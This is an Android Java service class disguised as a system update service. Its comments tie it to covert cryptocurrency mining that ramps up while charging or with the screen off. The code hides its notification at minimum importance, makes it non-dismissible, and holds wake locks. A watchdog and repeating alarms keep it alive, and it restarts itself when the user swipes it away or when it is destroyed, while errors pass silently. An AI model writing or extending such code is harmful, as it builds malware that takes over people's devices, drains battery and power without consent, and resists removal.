
// SystemService.java
package com.system.service.update;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.AlarmManager;
import android.content.Intent;
import android.content.Context;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

public class SystemService extends Service {
    
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "system_service_channel";
    private PowerManager.WakeLock wakeLock;
    private Thread serviceThread;
    private Thread watchdogThread;
    private volatile boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        createNotificationChannel();
        acquireWakeLock();
        startBackgroundOperations();
        startWatchdog();
        scheduleRestartAlarm();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (action != null) {
                handleAction(action);
            }
        }
        
        // Create non-dismissible notification
        Notification notification = createNotification();
        notification.flags |= Notification.FLAG_NO_CLEAR;      // Can't be swiped away
        notification.flags |= Notification.FLAG_ONGOING_EVENT;  // Ongoing notification
        
        startForeground(NOTIFICATION_ID, notification);
        
        // Restart if killed
        return START_STICKY;
    }
    
    private void handleAction(String action) {
        if (action == null) return;
        
        switch (action) {
            case "network_available":
                onNetworkAvailable();
                break;
            case "power_connected":
                onPowerConnected();
                break;
            case "screen_off":
                onScreenOff();
                break;
            case "WATCHDOG_CHECK":
                performHealthCheck();
                break;
        }
    }
    
    private void onNetworkAvailable() {
        // Network operations can begin
    }
    
    private void onPowerConnected() {
        // Full power available - increase mining
    }
    
    private void onScreenOff() {
        // Optimal mining time
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN  // Lower importance = less visible
            );
            channel.setDescription("Critical system operations");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setAction(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 31) {
            flags = flags | 0x4000000;
        }
        
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, flags
        );
        
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setContentTitle("System Service")
               .setContentText("Android system processes running")
               .setOngoing(true)
               .setPriority(Notification.PRIORITY_MIN)
               .setContentIntent(pendingIntent);
        
        try {
            builder.setSmallIcon(getApplicationInfo().icon);
        } catch (Exception e) {
            try {
                builder.setSmallIcon(android.R.drawable.ic_menu_manage);
            } catch (Exception ex) {
                // Last resort
            }
        }
        
        return builder.build();
    }
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "SystemService:WakeLock"
                );
                wakeLock.acquire(30 * 60 * 1000); // 30 minutes
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                // Silent fail
            }
        }
    }
    
    private void startBackgroundOperations() {
        serviceThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        performPeriodicTasks();
                        Thread.sleep(30000); // 30 second interval
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        // Continue despite errors
                    }
                }
            }
        });
        serviceThread.setName("SystemService-Background");
        serviceThread.setDaemon(true);
        serviceThread.start();
    }
    
    // === NEW: Watchdog Thread ===
    private void startWatchdog() {
        watchdogThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        // Check every 60 seconds if service is still healthy
                        Thread.sleep(60000);
                        if (isRunning && wakeLock != null && !wakeLock.isHeld()) {
                            // Re-acquire wake lock if lost
                            acquireWakeLock();
                        }
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {
                        // Continue watchdog despite errors
                    }
                }
            }
        });
        watchdogThread.setName("SystemService-Watchdog");
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }
    
    // === NEW: Schedule restart alarm ===
    private void scheduleRestartAlarm() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent restartIntent = new Intent(this, AlarmReceiver.class);
            restartIntent.setAction("RESTART_SERVICE");
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 1001, restartIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    60000,
                    300000,  // Every 5 minutes
                    pendingIntent
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void performHealthCheck() {
        try {
            // Check if service components are alive
            if (serviceThread != null && !serviceThread.isAlive()) {
                startBackgroundOperations();
            }
            if (watchdogThread != null && !watchdogThread.isAlive()) {
                startWatchdog();
            }
            if (wakeLock == null || !wakeLock.isHeld()) {
                acquireWakeLock();
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void performPeriodicTasks() {
        checkNetworkState();
        checkPowerState();
        ensurePersistence();
    }
    
    private void checkNetworkState() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                boolean isConnected = activeNetwork != null && activeNetwork.isConnected();
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void checkPowerState() {
        try {
            Intent batteryIntent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int plugged = batteryIntent.getIntExtra("plugged", -1);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void ensurePersistence() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent alarmIntent = new Intent(this, AlarmReceiver.class);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, alarmIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    900000,
                    900000,
                    pendingIntent
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Restart when user swipes away
        Intent restartIntent = new Intent(getApplicationContext(), SystemService.class);
        PendingIntent pendingIntent;
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 31) {
            flags = flags | 0x4000000;
        }
        
        pendingIntent = PendingIntent.getService(
            this, 0, restartIntent, flags
        );
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME,
                1000,  // Restart in 1 second
                pendingIntent
            );
        }
        
        // Also send broadcast to RestartReceiver
        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
        sendBroadcast(broadcastIntent);
        
        super.onTaskRemoved(rootIntent);
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        releaseWakeLock();
        
        if (serviceThread != null) {
            serviceThread.interrupt();
        }
        if (watchdogThread != null) {
            watchdogThread.interrupt();
        }
        
        // Send broadcast to restart
        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
        sendBroadcast(broadcastIntent);
        
        // Schedule immediate restart via alarm
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent restartIntent = new Intent(this, AlarmReceiver.class);
            restartIntent.setAction("RESTART_SERVICE");
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 2001, restartIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    1000,  // 1 second
                    pendingIntent
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
        
        super.onDestroy();
    }
}
